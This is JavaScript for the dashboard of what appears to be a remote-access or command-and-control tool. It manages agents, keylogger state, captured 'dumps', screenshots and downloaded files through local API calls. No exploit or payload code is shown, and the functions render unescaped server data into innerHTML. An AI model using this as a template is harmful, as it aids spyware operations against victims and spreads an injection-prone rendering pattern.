// Global variables
let currentAgent = null;
let commandHistory = [];
let historyIndex = -1;

// Transfer status management
const TRANSFER_STATUS_KEY = 'fileTransferStatus';
const KEYLOGGER_STATE_KEY = 'keyloggerState';

// Keylogger functionality
let keyloggerActive = false;
let selectedKeyloggerAgent = null;
let logUpdateInterval = null;

// Dumps Tab Functions
let selectedDump = null;

function refreshDumps() {
    fetch('/api/dumps', {
        method: 'GET',
        headers: {
            'Content-Type': 'application/json'
        }
    })
    .then(response => response.json())
    .then(dumps => {
        const dumpsContainer = document.getElementById('dumps-items');
        if (!dumpsContainer) return;
        
        if (dumps.length === 0) {
            dumpsContainer.innerHTML = `
                <div class="no-dumps">
                    <p>No dumps available</p>
                </div>
            `;
            return;
        }

        dumpsContainer.innerHTML = dumps.map(dump => `
            <div class="dump-item ${selectedDump?.id === dump.id ? 'active' : ''}" 
                 onclick="selectDump('${dump.id}')">
                <div class="dump-item-header">
                    <span class="dump-item-name">${dump.name}</span>
                    <span class="dump-item-date">${formatDate(dump.timestamp)}</span>
                </div>
                <div class="dump-item-info">
                    <span class="dump-item-type">${dump.type}</span>
                    <span class="dump-item-size">${formatFileSize(dump.size)}</span>
                </div>
            </div>
        `).join('');
    })
    .catch(error => {
        console.error('Error fetching dumps:', error);
        const dumpsContainer = document.getElementById('dumps-items');
        if (dumpsContainer) {
            dumpsContainer.innerHTML = `
                <div class="no-dumps">
                    <p>Error loading dumps</p>
                </div>
            `;
        }
    });
}

function selectDump(dumpId) {
    fetch(`/api/dumps/${dumpId}`, {
        method: 'GET',
        headers: {
            'Content-Type': 'application/json'
        }
    })
    .then(response => response.json())
    .then(data => {
        selectedDump = data;
        
        // Update UI
        document.querySelectorAll('.dump-item').forEach(item => {
            item.classList.toggle('active', item.getAttribute('onclick').includes(dumpId));
        });

        const dumpContent = document.getElementById('dump-content');
        const dumpTitle = document.querySelector('.dump-title');
        const dumpDate = document.querySelector('.dump-date');

        if (dumpContent && dumpTitle && dumpDate) {
            dumpTitle.textContent = data.name;
            dumpDate.textContent = formatDate(data.timestamp);
            dumpContent.innerHTML = `<pre>${data.content}</pre>`;
        }
    })
    .catch(error => {
        console.error('Error loading dump:', error);
        const dumpContent = document.getElementById('dump-content');
        if (dumpContent) {
            dumpContent.innerHTML = `
                <div class="error-message">
                    <p>Error loading dump content</p>
                </div>
            `;
        }
    });
}

function downloadSelectedDump() {
    if (!selectedDump) {
        alert('No dump file selected');
        return;
    }

    const link = document.createElement('a');
    const blob = new Blob([selectedDump.content], { type: 'text/plain' });
    link.href = URL.createObjectURL(blob);
    link.download = selectedDump.name;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    URL.revokeObjectURL(link.href);
}

function copyDumpContent() {
    if (!selectedDump) {
        alert('No dump file selected');
        return;
    }

    navigator.clipboard.writeText(selectedDump.content)
        .then(() => {
            // Show temporary success message
            const button = document.querySelector('[onclick="copyDumpContent()"]');
            const icon = button.querySelector('.material-icons');
            const originalText = icon.textContent;
            icon.textContent = 'check';
            setTimeout(() => {
                icon.textContent = originalText;
            }, 2000);
        })
        .catch(err => {
            console.error('Failed to copy text:', err);
            alert('Failed to copy content to clipboard');
        });
}

function deleteSelectedDump() {
    if (!selectedDump) {
        alert('No dump file selected');
        return;
    }

    if (!confirm('Are you sure you want to delete this dump file?')) {
        return;
    }

    fetch(`/api/dumps/${selectedDump.id}`, {
        method: 'DELETE',
        headers: {
            'Content-Type': 'application/json'
        }
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            selectedDump = null;
            refreshDumps();
            // Reset dump viewer
            const dumpContent = document.getElementById('dump-content');
            const dumpTitle = document.querySelector('.dump-title');
            const dumpDate = document.querySelector('.dump-date');

            if (dumpContent && dumpTitle && dumpDate) {
                dumpTitle.textContent = 'No file selected';
                dumpDate.textContent = '';
                dumpContent.innerHTML = `
                    <div class="no-file-selected">
                        <span class="material-icons">description</span>
                        <p>Select a dump file to view its contents</p>
                    </div>
                `;
            }
        } else {
            throw new Error(data.message || 'Failed to delete dump');
        }
    })
    .catch(error => {
        console.error('Error deleting dump:', error);
        alert('Failed to delete dump file');
    });
}

function clearAllDumps() {
    if (!confirm('Are you sure you want to clear all dumps?')) {
        return;
    }

    fetch('/api/dumps/clear', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        }
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            selectedDump = null;
            refreshDumps();
            // Reset dump viewer
            const dumpContent = document.getElementById('dump-content');
            const dumpTitle = document.querySelector('.dump-title');
            const dumpDate = document.querySelector('.dump-date');

            if (dumpContent && dumpTitle && dumpDate) {
                dumpTitle.textContent = 'No file selected';
                dumpDate.textContent = '';
                dumpContent.innerHTML = `
                    <div class="no-file-selected">
                        <span class="material-icons">description</span>
                        <p>Select a dump file to view its contents</p>
                    </div>
                `;
            }
        } else {
            throw new Error(data.message || 'Failed to clear dumps');
        }
    })
    .catch(error => {
        console.error('Error clearing dumps:', error);
        alert('Failed to clear dumps');
    });
}

// Add search functionality
document.getElementById('dumps-search')?.addEventListener('input', (e) => {
    const searchTerm = e.target.value.toLowerCase();
    document.querySelectorAll('.dump-item').forEach(item => {
        const name = item.querySelector('.dump-item-name').textContent.toLowerCase();
        const type = item.querySelector('.dump-item-type').textContent.toLowerCase();
        item.style.display = name.includes(searchTerm) || type.includes(searchTerm) ? 'block' : 'none';
    });
});

// Tab switching functionality
document.querySelectorAll('.tab-button').forEach(button => {
    button.addEventListener('click', () => {
        // Remove active class from all buttons and panes
        document.querySelectorAll('.tab-button').forEach(btn => btn.classList.remove('active'));
        document.querySelectorAll('.tab-pane').forEach(pane => pane.classList.remove('active'));
        
        // Add active class to clicked button
        button.classList.add('active');
        
        // Show corresponding pane
        const tabId = button.getAttribute('data-tab');
        document.getElementById(`${tabId}-tab`).classList.add('active');
        
        // Refresh content if needed
        if (tabId === 'dumps') {
            refreshDumps();
        }
    });
});

// Storage Tab Functions
function refreshStorage() {
    fetch('/api/storage')
        .then(response => response.json())
        .then(data => {
            updateFileList('downloads-list', data.downloads);
            updateFileList('screenshots-list', data.screenshots);
        })
        .catch(error => {
            console.error('Error fetching storage:', error);
        });
}

function updateFileList(containerId, files) {
    const container = document.getElementById(containerId);
    if (!container) return;

    if (!files || files.length === 0) {
        container.innerHTML = `
            <div class="no-files">
                <p>No files available</p>
            </div>
        `;
        return;
    }

    container.innerHTML = files.map(file => `
        <div class="file-item">
            <div class="file-info">
                <div class="file-name">
                    <span class="material-icons">${getFileIcon(file.type)}</span>
                    ${file.name}
                </div>
                <span class="file-size">${formatFileSize(file.size)}</span>
                <span class="file-date">${formatDate(file.modified)}</span>
            </div>
            <div class="file-actions">
                ${file.type.match(/^(jpg|jpeg|png|gif)$/) ? `
                    <button title="Preview" onclick="previewFile('${file.path}')">
                        <span class="material-icons">visibility</span>
                    </button>
                ` : ''}
                <button title="Download" onclick="downloadFile('${file.path}')">
                    <span class="material-icons">download</span>
                </button>
                <button title="Delete" onclick="deleteFile('${file.path}')">
                    <span class="material-icons">delete</span>
                </button>
            </div>
        </div>
    `).join('');
}

function getFileIcon(type) {
    switch (type) {
        case 'jpg':
        case 'jpeg':
        case 'png':
        case 'gif':
            return 'image';
        case 'txt':
        case 'log':
            return 'description';
        case 'json':
            return 'data_object';
        default:
            return 'insert_drive_file';
    }
}

function downloadFile(path) {
    window.location.href = `/api/download_storage_file?path=${encodeURIComponent(path)}`;
}

function deleteFile(path) {
    if (!confirm('Are you sure you want to delete this file?')) {
        return;
    }

    fetch('/api/delete_file', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ path })
    })
    .then(response => response.json())
    .then(data => {
        if (data.error) {
            throw new Error(data.error);
        }
        refreshStorage();
    })
    .catch(error => {
        console.error('Error deleting file:', error);
        alert('Failed to delete file');
    });
}

function previewFile(path) {
    // Create modal for image preview
    const modal = document.createElement('div');
    modal.className = 'preview-modal';
    modal.innerHTML = `
        <div class="preview-content">
            <div class="preview-info">
                <span class="filename">${path.split('/').pop()}</span>
                <button class="close-preview" onclick="this.closest('.preview-modal').remove()">
                    <span class="material-icons">close</span>
                </button>
            </div>
            <img src="/api/preview_file?path=${encodeURIComponent(path)}" 
                 onload="this.style.opacity = 1"
                 onerror="this.closest('.preview-modal').innerHTML = '<div class=\'error-message\'><p>Failed to load image</p></div>'">
        </div>
    `;
    document.body.appendChild(modal);
}

// Add storage tab refresh on tab switch
document.querySelector('[data-tab="storage"]').addEventListener('click', refreshStorage); 